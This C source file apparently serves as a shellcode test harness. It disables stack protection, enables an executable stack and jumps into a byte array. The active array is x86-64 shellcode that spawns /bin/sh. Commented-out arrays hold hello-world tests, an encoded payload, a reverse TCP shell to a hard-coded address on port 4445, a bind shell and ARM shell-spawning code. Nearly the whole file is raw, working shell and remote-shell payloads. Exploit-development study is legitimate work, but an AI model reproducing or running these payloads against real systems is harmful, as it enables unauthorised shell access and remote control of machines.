/* gcc -g x86_64-shellcode.c -o xshellcode -fno-stack-protector -zexecstack*/
#include <stdio.h>
#include <string.h>

//char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
//char code[] = "\xeb\x0c\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a\xb0\x01\x40\xb7\x01\x48\x8d\x35\xe8\xff\xff\xb2\x0c\x0f\x05\xb0\x3c\x40\xb7\x01\x0f\x05";
//char code[] = "\xeb\x0c\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a\xb0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x8d\x35\xe4\xff\xff\xff\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05"; //simple hellow

//char code[] = "\xeb\x1f\x5e\xb0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdc\xff\xff\xff\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a";//simple jmp call hello
//char code[] = \
"\x48\x31\xc0\x48\x83\xc0\x01\x48\x89\xc7\x68\x72\x6c\x64\x0a\x48\xbb\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x53\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";//simple stack

char code [] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
//char code [] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
/*unsigned char code[] = 
"\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x65\x12\xdc\xa9\xe7\xdd\x18\x45\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x0f\x3b\x84\x30\x8d\xdf"
"\x47\x2f\x64\x4c\xd3\xac\xaf\x4a\x4a\x82\x61\x36\xde\xa9\xf6"
"\x81\x50\xcc\x83\x78\xcc\xf3\x8d\xec\x40\x4a\x60\x78\xee\xf1"
"\xe8\xd8\x50\x74\x93\x78\xf7\xf1\xe8\xd8\x50\xd2\x0f\x11\x82"
"\xe1\x18\x13\x72\x64\x3d\x1d\xd9\xdc\x11\xb7\x23\x1d\xfc\x5a"
"\x67\x86\x85\xb4\x76\x6a\x16\x7a\xdc\xfa\xaf\x54\xff\x17\x32"
"\x5a\x55\x4f\xe8\xd8\x18\x45";*/

//Reverse tcp 21 and 4445
/*unsigned char code[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x5b\x6a\x0a"
"\x41\x59\x56\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
"\x05\x48\x85\xc0\x78\x44\x48\x97\x48\xb9\x02\x00\x11\x5d\xc0"
"\xa8\x05\x15\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
"\x48\x85\xc0\x79\x1b\x49\xff\xc9\x74\x22\x6a\x23\x58\x6a\x00"
"\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x85\xc0\x79\xb7"
"\xeb\x0c\x59\x5e\x5a\x0f\x05\x48\x85\xc0\x78\x02\xff\xe6\x6a"
"\x3c\x58\x6a\x01\x5f\x0f\x05";*/

/*unsigned char code[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5d\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
"\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
"\x05\xff\xe6";*/
//char code[] = "\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x03\x1c\x0d\xa1\x4a\x70\x4a\x60\x10\x22\x01\x37\x01\xdf\x18\x1c\x02\x21\x02\x37\x01\xdf\x18\x1c\x49\x40\x52\x40\x01\x37\x01\xdf\x03\x1c\x03\x21\x3f\x27\x18\x1c\x01\x39\x01\xdf\x91\x42\xfa\xd1\x03\xa0\xc1\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58"; //Binshell

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}



